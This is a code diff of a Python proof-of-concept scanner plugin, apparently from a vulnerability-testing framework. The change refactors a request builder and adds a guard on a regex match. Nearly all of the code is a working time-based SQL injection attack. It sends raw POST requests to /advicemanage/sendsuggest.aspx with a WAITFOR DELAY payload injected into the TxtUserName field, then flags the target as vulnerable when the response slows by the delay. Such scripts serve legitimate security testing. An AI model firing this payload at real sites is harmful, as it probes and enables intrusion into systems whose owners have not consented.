@@ -39,10 +39,25 @@ class Poc(ABPoc):
             if code != 200:
                 return
             patten = re.findall(r'value=\"(?P<aa>[\w\+\/\=]{1,}?)\"',res)
-            p1 = urllib.quote(patten[0])
+            if patten:
+                p1 = urllib.quote(patten[0])
+                code1, head, res, errcode, _ = hh.http(preWork, raw=self.make_raw(p1,1))
+                timea = time.time()
+                code2, head, res, errcode, _ = hh.http(preWork, raw=self.make_raw(p1,5))
+                timeb = time.time()
+                if code1 == 200 and code2 == 200 and timeb - timea > 4.5:
+                    #security_hole(preWork)
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                        target=self.target, name=self.vuln.name))
 
-            def make_raw(view_state,sleep_time):
-                raw = '''
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
+
+    def exploit(self):
+        self.verify()
+    
+    def make_raw(self, view_state,sleep_time):
+        raw = '''
 POST /advicemanage/sendsuggest.aspx HTTP/1.1
 Host: localhost:800
 Proxy-Connection: keep-alive
@@ -59,22 +74,8 @@ Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.8
 
 __VIEWSTATE=
-                ''' + view_state + '''&TxtUserName=asdasd');WAITFOR DELAY '0:0:''' + str(sleep_time) + ''''--&TxtPhone=13012341234&TxtAddress=1+Llantwit+Street&TxtEmail=sadsd%40111.com&TxtTitle=sdasdasd&FCKContent=&IBSend.x=37&IBSend.y=11'''
-                return raw
-            code1, head, res, errcode, _ = hh.http(preWork, raw=make_raw(p1,1))
-            timea = time.time()
-            code2, head, res, errcode, _ = hh.http(preWork, raw=make_raw(p1,5))
-            timeb = time.time()
-            if code1 == 200 and code2 == 200 and timeb - timea > 4.5:
-                #security_hole(preWork)
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
-
-        except Exception, e:
-            self.output.info('执行异常{}'.format(e))
-
-    def exploit(self):
-        self.verify()
+                    ''' + view_state + '''&TxtUserName=asdasd');WAITFOR DELAY '0:0:''' + str(sleep_time) + ''''--&TxtPhone=13012341234&TxtAddress=1+Llantwit+Street&TxtEmail=sadsd%40111.com&TxtTitle=sdasdasd&FCKContent=&IBSend.x=37&IBSend.y=11'''
+        return raw
 
 if __name__ == '__main__':
     Poc().run()
